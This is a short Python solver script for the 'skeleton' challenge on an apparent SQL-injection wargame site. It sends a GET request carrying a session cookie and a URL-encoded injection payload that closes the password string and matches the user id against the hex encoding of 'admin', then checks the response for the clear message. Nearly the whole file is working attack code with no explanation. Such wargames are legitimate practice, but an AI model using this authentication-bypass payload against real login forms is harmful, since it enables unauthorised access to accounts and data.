import requests

url = "https://los.rubiya.kr/chall/skeleton_a857a5ab24431d6fb4a00577dac0f39c.php?"
cookie = {'PHPSESSID':'2l2tjeutp0q371uvicd2a3mtrc'}

def solve():
    query = "pw=%27%20or%20id=0x61646d696e%20%23"
    res = requests.get(url=url+query,cookies=cookie)
    if "SKELETON Clear!" in res.text:
        print("SKELETON Clear!")

if __name__ == "__main__":
    solve()
